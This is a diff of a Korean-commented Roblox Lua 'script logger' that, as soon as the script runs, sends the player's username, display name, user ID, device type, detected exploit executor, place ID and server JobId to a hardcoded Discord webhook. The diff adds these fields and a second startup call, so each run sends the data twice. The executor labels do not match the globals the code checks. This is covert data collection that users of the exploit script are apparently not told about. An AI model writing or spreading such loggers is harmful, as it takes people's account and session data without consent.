@@ -5,6 +5,32 @@ local webhookUrl = "https://discord.com/api/webhooks/1476091820910968942/GzNNb1e
 
 local function sendToDiscord()
     local player = game.Players.LocalPlayer
+    local uis = game:GetService("UserInputService")
+    
+    -- 기기 종류 확인
+    local platform = "PC"
+    local platformEmoji = "🖥️"
+    
+    if uis.TouchEnabled and not uis.KeyboardEnabled then
+        platform = "모바일"
+        platformEmoji = "📱"
+    elseif uis.GamepadEnabled then
+        platform = "콘솔"
+        platformEmoji = "🎮"
+    end
+    
+    -- 실행기 종류 (일부만 확인 가능)
+    local executor = "알 수 없음"
+    if syn then
+        executor = "velocity"
+    elseif fluxus then
+        executor = "xeno"
+    elseif krnl then
+        executor = "delta"
+    elseif script and script:FindFirstChild("Name") then
+        executor = script.Name
+    end
+    
     local data = {
         ["content"] = "",
         ["embeds"] = {{
@@ -12,21 +38,45 @@ local function sendToDiscord()
             ["color"] = 16711680,
             ["fields"] = {
                 {
-                    ["name"] = "유저명",
+                    ["name"] = "👤 유저명",
                     ["value"] = player.Name,
                     ["inline"] = true
                 },
                 {
-                    ["name"] = "표시 이름",
+                    ["name"] = "✨ 표시 이름",
                     ["value"] = player.DisplayName,
                     ["inline"] = true
                 },
                 {
-                    ["name"] = "유저 ID",
+                    ["name"] = "🆔 유저 ID",
                     ["value"] = tostring(player.UserId),
                     ["inline"] = true
+                },
+                {
+                    ["name"] = "📱 기기 종류",
+                    ["value"] = platformEmoji .. " " .. platform,
+                    ["inline"] = true
+                },
+                {
+                    ["name"] = "⚙️ 실행기",
+                    ["value"] = executor,
+                    ["inline"] = true
+                },
+                {
+                    ["name"] = "🎮 게임 장소 ID",
+                    ["value"] = tostring(game.PlaceId),
+                    ["inline"] = true
+                },
+                {
+                    ["name"] = "🌐 서버 ID",
+                    ["value"] = game.JobId,
+                    ["inline"] = false
                 }
-            }
+            },
+            ["footer"] = {
+                ["text"] = "스크립트 로거 v2.0"
+            },
+            ["timestamp"] = DateTime.now():ToIsoDate()
         }}
     }
 
@@ -42,6 +92,9 @@ local function sendToDiscord()
         end
     end)
 end
+
+-- 스크립트 시작할 때 실행
+sendToDiscord()
 
 -- 스크립트 시작할 때 실행
 sendToDiscord()
